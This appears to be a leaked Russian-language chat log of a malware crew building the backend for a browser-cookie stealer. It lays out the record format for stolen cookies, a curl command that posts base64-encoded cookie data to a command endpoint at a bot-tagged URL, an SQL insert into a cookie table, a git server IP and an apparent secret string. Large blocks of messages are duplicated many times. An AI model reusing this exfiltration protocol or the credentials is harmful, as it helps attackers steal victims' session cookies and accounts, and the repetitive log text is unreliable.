По факту ошибки посыпались. Документация не полная.
2021-08-31 09:41:31.313726	ttrr	hof	где же ты был )
2021-08-31 10:40:22.321823	ttrr	hof	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 10:40:58.855178	ttrr	hof	Я написал миграции под два поля secure и httponly
2021-08-31 10:41:19.042988	ttrr	hof	Оба логических.
2021-08-31 10:41:50.953509	ttrr	hof	не буду делать .
2021-08-31 10:41:53.236374	hof	ttrr	и в 90 команду добавились новые поля
2021-08-31 10:41:53.240939	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 10:42:06.309901	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 10:42:24.066732	hof	ttrr	поля не будут сохраняться, если их больше?
2021-08-31 10:42:24.071555	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 10:42:41.759921	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 10:42:55.644664	hof	ttrr	а, ок
2021-08-31 10:42:55.646911	ttrr	hof	а, ок
2021-08-31 10:42:55.699571	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 10:44:25.982350	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 10:44:38.110725	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 10:44:40.987819	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 10:46:16.071480	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:01:29.531061	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 11:05:53.202848	ttrr	hof	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 11:05:53.203338	ttrr	hof	всё - просто текст
2021-08-31 11:05:53.204557	ttrr	hof	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 11:05:53.205297	ttrr	hof	Ну, это тоже не очевидно)
По факту ошибки посыпались. Документация не полная.
2021-08-31 11:05:53.206066	ttrr	hof	где же ты был )
2021-08-31 11:05:53.207318	ttrr	hof	Zulas ты под новые поля базу тоже будешь менять?
Если да то просьба этого не делать, я веду миграции и хотелось бы чтобы все изменения в базе в них были отражены.
2021-08-31 11:05:53.208464	ttrr	hof	Я написал миграции под два поля secure и httponly
2021-08-31 11:05:53.209202	ttrr	hof	Оба логических.
2021-08-31 11:05:53.209995	ttrr	hof	не буду делать .
2021-08-31 11:05:53.211005	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 11:05:53.212453	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 11:05:53.218230	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 11:05:53.219750	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 11:05:53.220657	ttrr	hof	а, ок
2021-08-31 11:05:53.221791	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 11:05:53.222753	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 11:05:53.224142	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 11:05:53.225089	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 11:05:53.226731	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 11:05:53.227830	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 16:17:38.421299	ttrr	hof	Оба логических.
2021-08-31 16:17:38.421905	ttrr	hof	не буду делать .
2021-08-31 16:17:38.423063	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 16:17:38.423539	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 16:17:38.424179	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 16:17:38.425056	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 16:17:38.426067	ttrr	hof	а, ок
2021-08-31 16:17:38.426661	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 16:17:38.427372	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 16:17:38.428065	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 16:17:38.428553	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 16:17:38.429427	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 16:17:38.430186	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 16:17:38.431249	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 16:17:38.431931	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 16:17:38.432690	ttrr	hof	потому повтори этот вопрос как он появится
2021-08-31 16:17:38.433331	ttrr	hof	Оке, тут получается нет истории..
2021-08-31 16:17:38.433903	ttrr	hof	неа
2021-08-31 16:17:38.434523	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 16:17:38.435161	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-08-31 18:41:02.850531	ttrr	hof	Оба логических.
2021-08-31 18:41:02.851067	ttrr	hof	не буду делать .
2021-08-31 18:41:02.851360	ttrr	hof	и в 90 команду добавились новые поля
2021-08-31 18:41:02.852382	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-08-31 18:41:02.852705	ttrr	hof	поля не будут сохраняться, если их больше?
2021-08-31 18:41:02.853376	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-08-31 18:41:02.853987	ttrr	hof	а, ок
2021-08-31 18:41:02.854563	ttrr	hof	Пока не накатил, сек сделаю
2021-08-31 18:41:02.855263	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-08-31 18:41:02.855571	ttrr	hof	И в бэке его тоже вроде как нет
2021-08-31 18:41:02.856442	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-08-31 18:41:02.856868	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-08-31 18:41:02.857605	ttrr	hof	По 2м полям в куках накатил миграции.
2021-08-31 18:41:02.858561	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-08-31 18:41:02.859042	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-08-31 18:41:02.859349	ttrr	hof	потому повтори этот вопрос как он появится
2021-08-31 18:41:02.859776	ttrr	hof	Оке, тут получается нет истории..
2021-08-31 18:41:02.860797	ttrr	hof	неа
2021-08-31 18:41:02.861134	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-08-31 18:41:02.861644	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-01 06:33:14.077178	ttrr	hof	не буду делать .
2021-09-01 06:33:14.078486	ttrr	hof	и в 90 команду добавились новые поля
2021-09-01 06:33:14.079865	ttrr	hof	ты базу на рабочем уже поменял ?я могу слить дамп ?
2021-09-01 06:33:14.080419	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-01 06:33:14.081693	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-01 06:33:14.082683	ttrr	hof	а, ок
2021-09-01 06:33:14.083297	ttrr	hof	Пока не накатил, сек сделаю
2021-09-01 06:33:14.084529	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-01 06:33:14.085675	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-01 06:33:14.086361	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-01 06:33:14.087470	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-01 06:33:14.088428	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-01 06:33:14.089558	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-01 06:33:14.090588	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-01 06:33:14.091373	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-01 06:33:14.092189	ttrr	hof	Оке, тут получается нет истории..
2021-09-01 06:33:14.093159	ttrr	hof	неа
2021-09-01 06:33:14.094004	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-01 06:33:14.095147	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-01 06:33:14.096325	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-01 06:33:17.310295	hof	ttrr	oad
2021-09-01 06:33:17.317152	ttrr	hof	oad
2021-09-01 13:51:45.509167	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-01 13:52:09.084008	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-01 13:52:09.084812	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 06:50:10.716756	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-02 06:50:10.717364	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-02 06:50:10.718858	ttrr	hof	а, ок
2021-09-02 06:50:10.719167	ttrr	hof	Пока не накатил, сек сделаю
2021-09-02 06:50:10.719696	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-02 06:50:10.720441	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-02 06:50:10.721145	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-02 06:50:10.721803	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-02 06:50:10.722693	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-02 06:50:10.723442	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-02 06:50:10.724052	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-02 06:50:10.724559	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-02 06:50:10.725312	ttrr	hof	Оке, тут получается нет истории..
2021-09-02 06:50:10.725878	ttrr	hof	неа
2021-09-02 06:50:10.726691	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-02 06:50:10.727332	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 06:50:10.728061	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 06:50:10.728842	ttrr	hof	oad
2021-09-02 06:50:10.729351	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 06:50:10.730180	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 09:15:17.515733	ttrr	hof	поля не будут сохраняться, если их больше?
2021-09-02 09:15:17.516163	ttrr	hof	dlls, programs, services Я тоже уже добавил
2021-09-02 09:15:17.516817	ttrr	hof	а, ок
2021-09-02 09:15:17.517263	ttrr	hof	Пока не накатил, сек сделаю
2021-09-02 09:15:17.518042	ttrr	hof	Там поле под ярлыки desktop нужно еще, но пока не добавил его в миграцию.
2021-09-02 09:15:17.518365	ttrr	hof	И в бэке его тоже вроде как нет
2021-09-02 09:15:17.519110	ttrr	hof	добавляй сразу всё чтобы мне не возвращаться
2021-09-02 09:15:17.519424	ttrr	hof	Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
2021-09-02 09:15:17.520024	ttrr	hof	По 2м полям в куках накатил миграции.
2021-09-02 09:15:17.520815	ttrr	hof	такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.
2021-09-02 09:15:17.521209	ttrr	hof	хороший вопрос, но зуласа нету в конфе уже
2021-09-02 09:15:17.521852	ttrr	hof	потому повтори этот вопрос как он появится
2021-09-02 09:15:17.522386	ttrr	hof	Оке, тут получается нет истории..
2021-09-02 09:15:17.523035	ttrr	hof	неа
2021-09-02 09:15:17.523643	ttrr	hof	для того чтобы не заходить постоянно в конфу после релогина вверху есть звездочка, нажмите 2 раза и выберите автовход - всегда
2021-09-02 09:15:17.524435	ttrr	hof	потом когда конфа будет не актуальна звездочку снимите
2021-09-02 09:15:17.525230	ttrr	hof	 > такой вопрос есть. Из за чего может быть такое, что я делаю запрос, бэк мне отвечает /1/ но в логах уровня info запроса нет, при этом в базе тех данных, которые я передал тоже нет. 
В бэке написано что /1/ это всегда про ответ 200, но я заметил что он отвечает /1/ и если бот есть в базе, и если его нет.

для начала что за запрос ? можем мы его повторить на текущей системе чтобы я его видел ?
2021-09-02 09:15:17.525590	ttrr	hof	oad
2021-09-02 09:15:17.526294	ttrr	hof	К сожалению не можем.
Если с этим серверм будет такое же история я напишу
2021-09-02 09:15:17.526648	ttrr	hof	Как повторить к сожалению не знаю пока
2021-09-02 11:28:45.765014	ttrr	hof	всем привет
2021-09-02 11:28:50.926442	ttrr	hof	как дела с деро?
2021-09-02 11:29:03.159572	ttrr	hof	zulas: понятна проблема?
2021-09-02 11:30:43.885146	ttrr	hof	деф . привет .. а в чем проблема ?
2021-09-02 11:33:13.545290	ttrr	hof	driver: отпиши что ты мне написал сюда
2021-09-02 11:33:20.364659	ttrr	hof	ответ 403 был
2021-09-02 11:33:26.029367	ttrr	hof	с ним разобрались?
2021-09-02 11:36:33.218495	ttrr	hof	Бэк отвечает 403 на попытку отправить куки.
2021-09-02 11:36:55.084286	ttrr	hof	Внесли ли изменения связанные с новыми полями?
2021-09-02 11:38:21.044625	ttrr	hof	давайте конкретно: кто и что должен внести?
2021-09-02 11:38:32.054325	ttrr	hof	тк походу зулас даже не в курсе
2021-09-02 11:39:06.182362	ttrr	hof	4ый день мы тут что то обсуждаем, а в итоге ничего не делаем
2021-09-02 11:39:10.284873	ttrr	hof	в чем проблема?
2021-09-02 11:39:34.331834	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 11:39:51.361303	ttrr	hof	В базу должны записываться поля с такими же именами
2021-09-02 11:41:12.882030	ttrr	hof	я ничего не вносил пока ..
2021-09-02 11:41:48.451442	ttrr	hof	так уже пора внести
2021-09-02 11:41:53.197259	ttrr	hof	драйвер же просил
2021-09-02 11:42:05.655913	ttrr	hof	у нас доработка прямо сейчас в модуле сбора, требует этого
2021-09-02 11:42:10.208571	ttrr	hof	Ок. Когда?
2021-09-02 11:43:37.294638	ttrr	hof	Я не стал этого делать потому что мне сказали, что сейчас zulas занимается бэком, но я напрямую не писал задачу.
Возможно решил что вы с кодером модуля обсудили этот момент
2021-09-02 11:44:33.238680	ttrr	hof	(31.08.2021 13:44:35) zulas: добавляй сразу всё чтобы мне не возвращаться
(31.08.2021 13:46:11) driver: Пока не смогу. Ближе к вечеру время появится.
Там нужно в других частях это поле добавлять, поэтому быстро не смогу сделать.
(31.08.2021 14:01:24) driver: По 2м полям в куках накатил миграции.
2021-09-02 11:44:45.185064	ttrr	hof	ну вообще надо все сразу сделать и чтобы не возвращаться
2021-09-02 11:44:52.285746	ttrr	hof	переключение контекста -- очень тяжелая операция )
2021-09-02 11:45:14.307468	ttrr	hof	так что 
1. я жду когда в базу нужное внесется
2. когда мне будет объяснено что нужно делать
2021-09-02 11:59:16.917141	ttrr	hof	так а по-моему driver говорил что накатил миграции на базу. Это не оно?
цитату не приведу, уплыло в истории
2021-09-02 12:03:26.095535	ttrr	hof	driver: поясни мне чего ты ждешь?
2021-09-02 12:03:33.365511	ttrr	hof	что нужно от зуласа?
2021-09-02 12:11:37.702419	ttrr	hof	Дело в том что миграция по десктопу относится к другой задаче.
2021-09-02 12:11:51.016545	ttrr	hof	Сейчас нужно сделать 2 этих поля
2021-09-02 12:12:18.872112	ttrr	hof	zulas: сделаешь?
2021-09-02 12:14:06.097561	ttrr	hof	Более того к другой команде и к другой таблице.
2021-09-02 12:15:43.897550	ttrr	hof	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-02 12:17:36.626210	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-02 12:18:22.060042	ttrr	hof	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-02 12:20:09.147689	ttrr	hof	ок .. сейчас в базе поля уже есть ?
2021-09-02 12:20:19.947743	ttrr	hof	Да
2021-09-02 12:28:19.572533	ttrr	hof	а старые клиенты еще работают ?
2021-09-02 12:28:40.296562	ttrr	hof	т.е. надо поддерживать и старый формат и новый ?
2021-09-02 12:29:44.534785	ttrr	hof	Нет, просто только новый должен начать работать.
2021-09-02 12:30:37.243111	ttrr	hof	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-02 12:59:04.946587	ttrr	hof	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-02 13:03:56.542085	ttrr	hof	хорошо сделаю
2021-09-02 13:23:09.881679	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-02 13:23:13.464082	ttrr	hof	такая последовательность ?
2021-09-02 13:23:20.884376	ttrr	hof	@driver
2021-09-02 13:26:57.392049	ttrr	hof	@defender как мне запушить изменения ?
2021-09-02 13:37:09.263205	ttrr	hof	Да все верно.
2021-09-02 14:18:44.638101	ttrr	hof	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-02 16:43:17.462278	ttrr	hof	я его 100 раз забыл
2021-09-02 16:43:37.840304	ttrr	hof	~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
2021-09-02 16:44:19.026213	ttrr	hof	ок, щас в личку кину
2021-09-03 07:23:12.980938	ttrr	hof	@driver давай конкретно что тебе надо и куда ... ок ?
2021-09-03 07:23:12.981885	ttrr	hof	Нужно в 84 команду внести 2 поля.
secure, httponly в конец приема, получается 9 и 10 поле должно быть.
2021-09-03 07:23:12.982726	ttrr	hof	На запрос вида 
curl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/
Должно ответить /1/
2021-09-03 07:23:12.983789	ttrr	hof	ок .. сейчас в базе поля уже есть ?
2021-09-03 07:23:12.984230	ttrr	hof	Да
2021-09-03 07:23:12.985196	ttrr	hof	а старые клиенты еще работают ?
2021-09-03 07:23:12.985809	ttrr	hof	т.е. надо поддерживать и старый формат и новый ?
2021-09-03 07:23:12.986793	ttrr	hof	Нет, просто только новый должен начать работать.
2021-09-03 07:23:12.987449	ttrr	hof	Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку
2021-09-03 07:23:12.988502	ttrr	hof	zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться
2021-09-03 07:23:12.988947	ttrr	hof	хорошо сделаю
2021-09-03 07:23:12.989927	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]
2021-09-03 07:23:12.990465	ttrr	hof	такая последовательность ?
2021-09-03 07:23:12.991282	ttrr	hof	@driver
2021-09-03 07:23:12.991842	ttrr	hof	@defender как мне запушить изменения ?
2021-09-03 07:23:12.992439	ttrr	hof	Да все верно.
2021-09-03 07:23:12.993031	ttrr	hof	zulas: а я тебе вроде выдавал доступ, разве нет?
2021-09-03 07:23:12.994069	ttrr	hof	я его 100 раз забыл
2021-09-03 07:23:12.994773	ttrr	hof	~/erl/dero> git -c credential.helper=/usr/share/smartgit/lib/credentials.sh push --porcelain --progress --recurse-submodules=check origin refs/heads/master:refs/heads/master
unable to access 'https://179.43.147.243/begemot/dero.git/': gnutls_handshake() failed: Internal error
2021-09-03 07:23:12.995650	ttrr	hof	ок, щас в личку кину
2021-09-03 09:27:34.710180	ttrr	hof	Добрый день! Как успехи по пушу кода?
2021-09-03 09:28:03.407013	ttrr	hof	@zulas @defender
2021-09-03 09:28:22.267375	ttrr	hof	надо запушить . жду дефа
2021-09-03 09:31:17.971027	ttrr	hof	Ок
2021-09-03 11:49:56.200310	ttrr	hof	А есть вариант просто на сервер залить этот код пока что?
2021-09-03 11:50:22.705601	ttrr	hof	Чтобы мы потестили, а с гитом позже разобраться7
2021-09-03 11:57:50.005207	ttrr	hof	зулас запушил
2021-09-03 11:57:56.219383	ttrr	hof	я его попросил выгрузить на сервер
2021-09-03 11:58:32.838558	ttrr	hof	 driver или ты выгрузи сам
2021-09-03 12:17:17.911828	ttrr	hof	Ок
2021-09-03 12:17:26.285571	ttrr	hof	Выгружу.
2021-09-03 12:54:25.744793	ttrr	hof	SQL = "INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )",
2021-09-03 12:55:03.224171	ttrr	hof	@zulas не вставил 2 поля в запрос в базу.
2021-09-03 12:55:17.837652	ttrr	hof	Поправь пожалуйста.
2021-09-03 13:02:44.311709	ttrr	hof	И таблицу архива куков, там тоже эти 2 поля нужны будут.
2021-09-03 13:03:34.031083	ttrr	hof	По остальному посмотрел, вижу схему нормальную сделал, все ок. Это у нас недавно было актуальной проблемой.
2021-09-03 13:04:19.050514	ttrr	hof	cookies_archive*
2021-09-03 13:23:45.184958	ttrr	hof	zulas отпиши по времени, когда сможешь сделать фиксы
2021-09-03 13:44:34.796607	ttrr	hof	щас посмотрю
2021-09-03 13:46:05.462879	ttrr	hof	@driver cookies_archive* .. я такой таблицей не пользуюсь
2021-09-03 13:56:14.445082	ttrr	hof	пофиксил запрос
2021-09-03 13:56:17.184880	ttrr	hof	не тестировал
2021-09-06 07:10:08.071474	ttrr	hof	сегодня отдых у всех ?
2021-09-06 10:24:06.853170	ttrr	hof	сегодня отдых у всех ?
2021-09-06 14:25:14.173391	ttrr	hof	сегодня отдых у всех ?
2021-09-07 07:12:19.348324	ttrr	hof	сегодня отдых у всех ?
2021-09-07 17:51:07.156128	ttrr	hof	сегодня отдых у всех ?
2021-09-08 06:28:58.561881	ttrr	hof	сегодня отдых у всех ?
2021-09-09 07:31:36.704969	ttrr	hof	сегодня отдых у всех ?
2021-09-10 07:06:36.942857	ttrr	hof	сегодня отдых у всех ?
2021-09-13 06:35:46.794717	ttrr	hof	сегодня отдых у всех ?
2021-09-14 08:12:09.363241	ttrr	hof	сегодня отдых у всех ?
2021-09-14 08:12:09.364003	ttrr	hof	есть кто
2021-09-15 07:09:26.714623	ttrr	hof	сегодня отдых у всех ?
2021-09-15 07:09:26.715161	ttrr	hof	есть кто
2021-09-16 06:48:07.676226	ttrr	hof	сегодня отдых у всех ?
2021-09-16 06:48:07.676799	ttrr	hof	есть кто
2021-09-16 07:03:23.248640	ttrr	hof	сегодня отдых у всех ?
2021-09-16 07:03:23.249288	ttrr	hof	есть кто
2021-09-16 07:44:08.221615	ttrr	hof	сегодня отдых у всех ?
2021-09-16 07:44:08.222902	ttrr	hof	есть кто
2021-09-16 15:03:14.324045	ttrr	hof	сегодня отдых у всех ?
2021-09-16 15:03:14.324712	ttrr	hof	есть кто
2021-09-17 06:38:25.586569	ttrr	hof	сегодня отдых у всех ?
2021-09-17 06:38:25.587545	ttrr	hof	есть кто
2021-09-20 07:03:38.429758	ttrr	hof	сегодня отдых у всех ?
2021-09-20 07:03:38.430364	ttrr	hof	есть кто
2021-09-21 08:12:31.353649	ttrr	hof	сегодня отдых у всех ?
2021-09-21 08:12:31.355229	ttrr	hof	есть кто
2021-09-21 10:18:12.568573	ttrr	hof	сегодня отдых у всех ?
2021-09-21 10:18:12.570067	ttrr	hof	есть кто
2021-12-09 18:55:28.384496	hof	ttrr	lIR7bXIxAukQuss2rg1Z
2021-12-09 18:55:28.387517	ttrr	hof	lIR7bXIxAukQuss2rg1Z
